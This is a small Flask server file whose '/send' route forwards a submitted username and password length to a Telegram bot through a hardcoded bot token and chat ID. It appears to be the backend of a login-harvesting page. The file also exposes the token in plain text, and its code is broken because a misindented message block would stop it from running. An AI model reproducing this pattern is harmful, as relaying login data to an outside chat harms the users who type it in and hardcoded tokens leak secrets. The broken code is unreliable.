from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8941028344:AAEYsRq2psDO5o5CCxYIM7Q_z9ryE9s6PZo"
CHAT_ID = "1584744130"


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send", methods=["POST"])
def send():

    data = request.json

message = f"""
New message

Username: {data.get('username')}
Password length: {data.get('passwordLength')}
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    response = requests.post(
        url,
        json={
            "chat_id": CHAT_ID,
            "text": message
        }
    )

    print(response.text)

    return jsonify({
        "success": True
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(
        host="0.0.0.0",
        port=port
    )